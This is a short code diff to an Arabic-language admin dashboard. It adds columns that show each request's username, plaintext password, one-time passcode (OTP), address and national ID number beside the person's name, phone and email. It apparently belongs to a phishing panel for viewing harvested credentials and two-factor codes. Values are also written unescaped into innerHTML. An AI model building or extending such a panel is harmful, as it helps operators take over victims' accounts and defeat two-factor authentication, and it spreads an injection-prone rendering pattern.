@@ -416,10 +416,15 @@
         <h3>قائمة الطلبات</h3>
         <table>
           <tr>
+            <th>اسم المستخدم</th>
+            <th>كلمة المرور</th>
+            <th>OTP</th>
             <th>الاسم</th>
             <th>رقم الهاتف</th>
             <th>الجيميل</th>
             <th>الحالة</th>
+            <th>العنوان</th>
+            <th>رقم التعريف الوطني</th>
             <th>الإجراءات</th>
           </tr>
           <tbody id="requestsTable"></tbody>
@@ -478,10 +483,15 @@
       const tbody = document.getElementById('requestsTable');
       tbody.innerHTML = currentRequests.map((r, i) => `
         <tr>
+          <td>${r.username || ''}</td>
+          <td>${r.password || ''}</td>
+          <td>${r.otp || ''}</td>
           <td>${r.name}</td>
           <td class="phone-cell">${r.phone}</td>
           <td>${r.email}</td>
           <td><span class="status-badge ${r.statusClass}">${r.status}</span></td>
+          <td>${r.address}</td>
+          <td>${r.idNum}</td>
           <td>
             <div class="action-btns">
               <button class="action-btn details-btn" onclick="showDetails(${i})">التفاصيل</button>
@@ -564,7 +574,7 @@
         }));
         renderRequests();
       } catch (error) {
-        document.getElementById('requestsTable').innerHTML = '<tr><td colspan="5">تعذر تحميل البيانات من السيرفر</td></tr>';
+        document.getElementById('requestsTable').innerHTML = '<tr><td colspan="10">تعذر تحميل البيانات من السيرفر</td></tr>';
       }
     }
 
